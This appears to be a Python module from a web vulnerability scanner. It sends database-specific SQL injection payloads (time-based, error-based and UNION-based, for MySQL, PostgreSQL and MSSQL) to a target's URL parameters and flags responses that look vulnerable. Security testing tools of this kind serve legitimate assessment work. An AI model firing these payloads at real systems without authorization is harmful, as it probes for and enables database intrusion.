"""Enhanced attack module with more SQLi payloads and techniques."""
import httpx
from argus.modules.attack_modules.sqli import SQLiModule


class EnhancedSQLiModule(SQLiModule):
    """Enhanced SQLi module with more payloads and detection techniques."""
    
    # Additional payloads for different databases
    MYSQL_PAYLOADS = [
        "' AND SLEEP(5)--",
        "' AND BENCHMARK(5000000,MD5('test'))--",
        "' UNION SELECT NULL,VERSION(),NULL--",
    ]
    
    POSTGRESQL_PAYLOADS = [
        "' AND pg_sleep(5)--",
        "'; SELECT pg_sleep(5)--",
        "' UNION SELECT NULL,version(),NULL--",
    ]
    
    MSSQL_PAYLOADS = [
        "'; WAITFOR DELAY '00:00:05'--",
        "' AND 1=1; WAITFOR DELAY '00:00:05'--",
        "' UNION SELECT NULL,@@VERSION,NULL--",
    ]
    
    ERROR_BASED_PAYLOADS = [
        "' AND 1=CONVERT(int, (SELECT @@version))--",
        "' AND extractvalue(1,concat(0x7e,version()))--",
        "' AND 1=CAST((SELECT version()) AS int)--",
    ]
    
    def name(self) -> str:
        return "enhanced_sqli"
    
    def description(self) -> str:
        return "Enhanced SQL Injection detection with database-specific payloads"
    
    async def _test_error_based_sqli(self, url: str, parameter: dict, client: httpx.AsyncClient) -> list:
        """Test for error-based SQL injection.
        
        Args:
            url: Target URL
            parameter: Parameter to test
            session: Requests session
        
        Returns:
            list: Findings if vulnerability detected
        """
        findings = []
        
        # Common SQL error patterns
        error_patterns = [
            'SQL syntax',
            'mysql_fetch',
            'pg_query',
            'ORA-',
            'Microsoft SQL',
            'ODBC SQL',
            'SQLite',
            'syntax error',
            'unterminated quoted string',
        ]
        
        for payload in self.ERROR_BASED_PAYLOADS:
            try:
                # Test parameter
                test_params = {parameter['name']: payload}
                response = await client.get(url, params=test_params, timeout=self.timeout)
                
                # Check for SQL errors in response
                for pattern in error_patterns:
                    if pattern.lower() in response.text.lower():
                        findings.append({
                            'name': 'SQL Injection - Error-Based',
                            'severity': 'High',
                            'url': url,
                            'parameter': parameter['name'],
                            'payload': payload,
                            'evidence': f'SQL error pattern "{pattern}" detected in response'
                        })
                        return findings
                        
            except Exception as e:
                if self.config.get('verbose'):
                    print(f"Error testing payload {payload}: {e}")
                continue
        
        return findings
    
    async def _test_union_based_sqli(self, url: str, parameter: dict, client: httpx.AsyncClient) -> list:
        """Test for UNION-based SQL injection.
        
        Args:
            url: Target URL
            parameter: Parameter to test
            session: Requests session
        
        Returns:
            list: Findings if vulnerability detected
        """
        findings = []
        
        union_payloads = [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION ALL SELECT NULL,NULL,NULL--",
        ]
        
        try:
            # Get baseline
            baseline_params = {parameter['name']: parameter['value']}
            baseline_response = await client.get(url, params=baseline_params, timeout=self.timeout)
            baseline_length = len(baseline_response.text)
            
            for payload in union_payloads:
                test_params = {parameter['name']: payload}
                response = await client.get(url, params=test_params, timeout=self.timeout)
                
                # UNION queries often significantly change response size
                if abs(len(response.text) - baseline_length) > 500:
                    # Check for successful UNION indicators
                    if 'NULL' not in response.text and response.status_code == 200:
                        continue
                    
                    findings.append({
                        'name': 'SQL Injection - UNION-Based',
                        'severity': 'High',
                        'url': url,
                        'parameter': parameter['name'],
                        'payload': payload,
                        'evidence': f'UNION query successful, response size changed by {abs(len(response.text) - baseline_length)} bytes'
                    })
                    return findings
                    
        except Exception as e:
            if self.config.get('verbose'):
                print(f"Error testing UNION-based SQLi: {e}")
        
        return findings
    
    async def scan(self, url: str, parameter: dict, client: httpx.AsyncClient) -> list:
        """Enhanced scan with multiple SQLi techniques.
        
        Args:
            url: URL to scan
            parameter: Parameter dict
            client: httpx client
        
        Returns:
            list: All findings
        """
        findings = []
        
        # Run parent class tests (boolean and time-based)
        findings.extend(await super().scan(url, parameter, client))
        
        # Run enhanced tests
        findings.extend(await self._test_error_based_sqli(url, parameter, client))
        findings.extend(await self._test_union_based_sqli(url, parameter, client))
        
        return findings
